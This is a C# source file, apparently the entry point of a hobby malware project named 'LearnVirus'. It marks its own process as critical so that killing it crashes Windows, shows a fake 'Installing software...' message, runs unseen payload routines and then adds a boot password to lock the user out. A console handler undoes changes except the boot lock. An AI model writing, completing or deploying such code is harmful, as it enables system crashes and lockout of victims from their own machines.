using System;
using System.Threading;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace LearnVirus
{
    class Program
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        static void Main()
        {
            // Register the handler
            SetConsoleCtrlHandler(Handler, true);

            int isCritical = 1;
            int BreakOnTermination = 0x1D;
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int)); //Crash system on taskkill

            Console.WriteLine("Installing software...");
            Virus.Virus.RunPayloads();

            Thread.Sleep(150000);

            Virus.Lock.LockLogin(); //Add boot password
        }

        // https://docs.microsoft.com/en-us/windows/console/setconsolectrlhandler?WT.mc_id=DT-MVP-5003978
        [DllImport("Kernel32")]
        private static extern bool SetConsoleCtrlHandler(SetConsoleCtrlEventHandler handler, bool add);

        // https://docs.microsoft.com/en-us/windows/console/handlerroutine?WT.mc_id=DT-MVP-5003978
        private delegate bool SetConsoleCtrlEventHandler(CtrlType sig);

        private enum CtrlType
        {
            CTRL_C_EVENT = 0,
            CTRL_BREAK_EVENT = 1,
            CTRL_CLOSE_EVENT = 2,
            CTRL_LOGOFF_EVENT = 5,
            CTRL_SHUTDOWN_EVENT = 6
        }

        private static bool Handler(CtrlType signal)
        {
            switch (signal)
            {
                case CtrlType.CTRL_BREAK_EVENT:
                case CtrlType.CTRL_C_EVENT:
                case CtrlType.CTRL_LOGOFF_EVENT:
                case CtrlType.CTRL_SHUTDOWN_EVENT:
                case CtrlType.CTRL_CLOSE_EVENT:
                    Virus.Virus.Reset(); //Revert everything except for boot lock
                    // TODO Cleanup resources
                    Environment.Exit(0);
                    return false;

                default:
                    return false;
            }
        }
    }
}
